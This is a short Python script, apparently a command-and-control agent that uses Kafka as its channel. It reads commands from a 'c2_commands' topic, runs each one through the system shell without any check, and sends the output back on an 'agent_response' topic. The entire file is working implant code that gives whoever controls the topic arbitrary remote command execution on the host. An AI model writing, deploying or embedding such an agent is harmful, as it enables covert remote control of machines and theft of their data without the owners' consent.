from kafka import KafkaConsumer,KafkaProducer
import subprocess


KAFKA_BROKER = 'localhost:9092'
KAFKA_TOPIC_AS_PRODUCER = 'agent_response'
KAFKA_TOPIC_AS_CONSUMER = 'c2_commands'


consumer = KafkaConsumer(KAFKA_TOPIC_AS_CONSUMER)
producer = KafkaProducer(bootstrap_servers=KAFKA_BROKER)

def callback(output):
    print(f"-> {output.value.decode('utf-8')} Delivered Succesfully!!!!")

def execute_command(command):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout.strip() if result.returncode == 0 else result.stderr.strip()


def get_command():
    try:
        print('Waiting for command......')
        for msg in consumer:
            command = msg.value.decode('utf-8')
            print(f"command: {command}")
            print('Executing the command......')
            output = execute_command(command)
            print("Execution Done.....\n")
            print(f"->Command {command} Output on Agent: {output}\n")
            producer.send(KAFKA_TOPIC_AS_PRODUCER,value=output.encode('utf-8'))
            print(f'-> {output} sent to {KAFKA_TOPIC_AS_PRODUCER} topic.....\n')
            print('Waiting for command......')
    except KeyboardInterrupt:
        print('Interrupted by User')

if __name__ == '__main__':
    get_command()